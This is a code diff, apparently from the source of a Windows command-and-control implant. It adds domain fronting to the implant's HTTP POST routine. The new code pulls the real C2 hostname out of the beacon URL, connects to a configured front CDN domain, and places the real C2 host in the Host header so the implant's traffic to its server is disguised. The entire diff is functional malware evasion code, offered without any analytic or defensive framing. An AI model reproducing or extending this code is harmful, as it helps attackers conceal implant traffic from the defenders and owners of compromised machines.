@@ -173,7 +173,25 @@ static char *HttpPost(const char *url, const char *ua,
     INTERNET_PORT port = 443;
     BOOL https = FALSE;
 
+    /* Extract real C2 hostname (ASCII) before ParseURL for domain fronting */
+    char realHostA[256] = {0};
+    {
+        const char *p = url;
+        if (strncmp(p, "https://", 8) == 0) p += 8;
+        else if (strncmp(p, "http://", 7) == 0) p += 7;
+        int i = 0;
+        while (*p && *p != '/' && *p != ':' && i < 255) realHostA[i++] = *p++;
+    }
+
     ParseURL(url, wHost, 256, wPath, 512, &port, &https);
+
+    /* Domain fronting: connect to front CDN but send Host: <real_c2> header */
+    WCHAR wConnectHost[256];
+    if (CFG_FRONT_DOMAIN[0]) {
+        StrToWstr(CFG_FRONT_DOMAIN, wConnectHost, 256);
+    } else {
+        memcpy(wConnectHost, wHost, sizeof(wHost));
+    }
 
     HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
     char *result = NULL;
@@ -193,7 +211,7 @@ static char *HttpPost(const char *url, const char *ua,
     pWinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT, &to, sizeof(to));
     pWinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &to, sizeof(to));
 
-    hConnect = pWinHttpConnect(hSession, wHost, port, 0);
+    hConnect = pWinHttpConnect(hSession, wConnectHost, port, 0);
     if (!hConnect) goto done;
 
     DWORD reqFlags = https ? WINHTTP_FLAG_SECURE : 0;
@@ -210,12 +228,14 @@ static char *HttpPost(const char *url, const char *ua,
         pWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &opts, sizeof(opts));
     }
 
-    /* Build header string using active profile's Content-Type */
-    char hdrA[256];
-    xsnprintf(hdrA, sizeof(hdrA), "Content-Type: %s\r\n%s",
-              s_active_profile->ct, s_active_profile->headers);
-    WCHAR hdrW[512] = {0};
-    StrToWstr(hdrA, hdrW, 512);
+    /* Build header string: Content-Type + profile headers + Host (if fronting) */
+    char hdrA[512];
+    int hlen = xsnprintf(hdrA, sizeof(hdrA), "Content-Type: %s\r\n%s",
+                         s_active_profile->ct, s_active_profile->headers);
+    if (CFG_FRONT_DOMAIN[0] && hlen > 0 && hlen < (int)sizeof(hdrA) - 64)
+        xsnprintf(hdrA + hlen, sizeof(hdrA) - hlen, "Host: %s\r\n", realHostA);
+    WCHAR hdrW[1024] = {0};
+    StrToWstr(hdrA, hdrW, 1024);
 
     if (!pWinHttpSendRequest(hRequest,
                               hdrW,
